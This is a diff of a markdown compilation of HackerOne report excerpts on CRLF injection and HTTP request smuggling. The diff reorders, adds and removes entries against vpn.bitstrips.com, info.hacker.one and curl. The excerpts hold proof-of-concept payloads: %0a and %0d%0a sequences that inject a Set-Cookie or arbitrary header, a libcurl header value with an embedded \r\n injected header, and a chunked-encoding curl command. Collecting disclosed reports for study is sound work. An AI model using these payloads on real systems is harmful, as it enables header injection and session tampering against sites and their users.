@@ -1428,37 +1428,6 @@ stage.██████████.		59	IN	A	█████
     engine.start()    
 ```
 
-## #237357 CRLF Injection at vpn.bitstrips.com — snapchat — - — CRLF Injection
-Source: `hackerone/reports/2017/237357.md` (https://hackerone.com/reports/237357)
-
-```
-https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1
-
-Host: vpn.bitstrips.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
-Accept: text/plain, */*
-Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest
-X-OpenVPN: 1
-X-CWS-Proto-Ver: 2
-Referer: https://vpn.bitstrips.com/?src=connect
-Content-Length: 29
-Cookie: openvpn_sess_73209e0b8ad597c3861a05a79e873389=e769bd6ab9896e586227df60f33836f0
-Connection: keep-alive
-```
-
-```
-HTTP/1.1 302 Found
-Transfer-Encoding: chunked
-Date: Tue, 06 Jun 2017 20:00:36 GMT
-Content-Type: text/html; charset=UTF-8
-Location: https://vpn.bitstrips.com/
-Set-Cookie: malicious_cookie1
-Server: OpenVPN-AS
-```
-
 ## #3479203 HTTP/3 Protocol Smuggling and Header Injection via CRLF in QPACK value conversion — curl — - — CRLF Injection
 Source: `hackerone/reports/2025/3479203.md` (https://hackerone.com/reports/3479203)
 
@@ -1488,6 +1457,37 @@ Source: `hackerone/reports/2025/3479203.md` (https://hackerone.com/reports/34792
 
 ```
       browser/client behind it processes the injected malicious header.
+```
+
+## #237357 CRLF Injection at vpn.bitstrips.com — snapchat — - — CRLF Injection
+Source: `hackerone/reports/2017/237357.md` (https://hackerone.com/reports/237357)
+
+```
+https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1
+
+Host: vpn.bitstrips.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/plain, */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+X-OpenVPN: 1
+X-CWS-Proto-Ver: 2
+Referer: https://vpn.bitstrips.com/?src=connect
+Content-Length: 29
+Cookie: openvpn_sess_73209e0b8ad597c3861a05a79e873389=e769bd6ab9896e586227df60f33836f0
+Connection: keep-alive
+```
+
+```
+HTTP/1.1 302 Found
+Transfer-Encoding: chunked
+Date: Tue, 06 Jun 2017 20:00:36 GMT
+Content-Type: text/html; charset=UTF-8
+Location: https://vpn.bitstrips.com/
+Set-Cookie: malicious_cookie1
+Server: OpenVPN-AS
 ```
 
 ## #3249936 HTTP Request Smuggling Vulnerability Analysis - cURL Security Report — curl — - — HTTP Request Smuggling
@@ -1535,18 +1535,15 @@ Source: `hackerone/reports/2025/3249936.md` (https://hackerone.com/reports/32499
    
 ```
 
-## #217058 CRLF injection in info.hacker.one — security — - — CRLF Injection
-Source: `hackerone/reports/2017/217058.md` (https://hackerone.com/reports/217058)
+## #3793495 Incomplete Suppression of  Transfer-Encoding: chunked Header in HTTP/2 After Redirect From HTTP/1.1 — curl — - — HTTP Request Smuggling
+Source: `hackerone/reports/2026/3793495.md` (https://hackerone.com/reports/3793495)
 
 ```
-GET /%0d%0a%09headername:%20headervalue HTTP/1.1
-Host: info.hacker.one
-Connection: Keep-alive
-Accept-Encoding: gzip,deflate
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
-Accept: */*
-
-Response
+curl -vvv --http1.1 --no-alpn -L --http2 -k \
+  -H "Transfer-Encoding: chunked" \
+  -H "Content-Type: text/plain" \
+  -d "This is chunked encoding bug test data" \
+  http://test.local:8080/
 ```
 
 ## #3235428 CRLF injection in libcurl's SMTP client via --mail-from and --mail-rcpt allows SMTP command smuggling — curl — - — CRLF Injection
@@ -1594,29 +1591,37 @@ $ curl -vf --url "smtp://localhost:1025/" --mail-from "attacker@example.com" --m
 * Connection #0 to host localhost left intact
 ```
 
-## #3793495 Incomplete Suppression of  Transfer-Encoding: chunked Header in HTTP/2 After Redirect From HTTP/1.1 — curl — - — HTTP Request Smuggling
-Source: `hackerone/reports/2026/3793495.md` (https://hackerone.com/reports/3793495)
+## #217058 CRLF injection in info.hacker.one — security — - — CRLF Injection
+Source: `hackerone/reports/2017/217058.md` (https://hackerone.com/reports/217058)
 
 ```
-curl -vvv --http1.1 --no-alpn -L --http2 -k \
-  -H "Transfer-Encoding: chunked" \
-  -H "Content-Type: text/plain" \
-  -d "This is chunked encoding bug test data" \
-  http://test.local:8080/
+GET /%0d%0a%09headername:%20headervalue HTTP/1.1
+Host: info.hacker.one
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+Response
 ```
 
-## #3481849 HTTP/2 and HTTP/3 Header Injection in curl — curl — - — HTTP Response Splitting
-Source: `hackerone/reports/2025/3481849.md` (https://hackerone.com/reports/3481849)
+## #3741744 CRLF Injection via Custom HTTP Headers — curl — - — CRLF Injection
+Source: `hackerone/reports/2026/3741744.md` (https://hackerone.com/reports/3741744)
 
 ```
-     result = curlx_dyn_addn(&ctx->scratch, STRCONST(": "));
-```
-
-```
-     result = curlx_dyn_addn(&ctx->scratch, (const char *)value, valuelen);  // UNVALIDATED
+    CURL *curl = curl_easy_init();
+    struct curl_slist *headers = NULL;
 ```
 
 ```
-     result = curlx_dyn_addn(&ctx->scratch, STRCONST("\r\n"));
+    // Simulates attacker-controlled input in a header value
+    headers = curl_slist_append(headers,
+        "X-Custom: legitimate\r\nInjected-Header: evil-value");
+```
+
+```
+    curl_easy_setopt(curl, CURLOPT_URL, "http://httpbin.org/get");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+    curl_easy_perform(curl);
 ```
 
